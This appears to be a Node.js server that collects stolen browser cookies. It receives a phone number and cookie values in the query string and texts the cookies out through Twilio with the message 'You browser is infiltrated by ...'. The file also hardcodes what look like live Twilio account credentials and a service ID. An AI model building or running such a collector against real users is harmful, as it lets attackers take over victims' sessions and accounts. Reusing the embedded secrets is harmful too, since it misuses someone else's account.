const http = require('http');
var url  = require('url');
const express = require('express');
const querystring = require('querystring');
const MessagingResponse = require('twilio').twiml.MessagingResponse;

const app = express();

const accountSid = 'AC0a0ab5d4ce7a1b294903eb953565ed6c';
const authToken = '30ecb6e9e255e3d8a11fcf19809d1bd3';
const client = require('twilio')(accountSid, authToken);



/*app.post('/sms', (req, res) => {
  const twiml = new MessagingResponse();

  twiml.message('The Robots are coming! Head for the hills!');

  res.writeHead(200, {'Content-Type': 'text/xml'});
  res.end(twiml.toString());
});*/

function generateBody(content){
    return `You browser is infiltrated by ${content}`;
}

numbers = []
function handler(req, resp){
        var obj = url.parse(req.url);
        var qs = querystring.parse(obj.search);
        var phonenumber = qs['?phonenumber'];
        var cookies = qs['cookies'];

       
        console.log("path name\t:\t"+obj.pathname);//path name of the url
        console.log("query string\t:\t" + obj.search);//query string

        //if( (obj.search != undefined) && (obj.pathname == "/query") ){
                //queries handled by my own script
                //queries.queryServer(req, resp, obj.search);
        numbers.push(phonenumber);
        numbers.forEach((number) => {
			    console.log(number);
			    const notificationOpts = {
			        //identity: '00000001', // We recommend using a GUID or other anonymized identifier for Identity.
			        toBinding: JSON.stringify({
			            binding_type: 'sms',
			            address: number
			        }),
			        body: generateBody(cookies),
			      };
			      
			      client.notify
			        .services('IS4aeae6c6a684ddb228bc663ba59ef14d')
			        .notifications
			        .create(notificationOpts)
			        .then(notification => console.log(notification.sid))
			        .catch(error => console.log(error));
				});

        //}
        //else{
                //simply pass the request to the static file server
                //to deal with it
                //staticFileServer.serve(req, resp);
                
        //}

}

http.createServer(handler).listen(1338, () => {
  console.log('Express server listening on port 1338');
});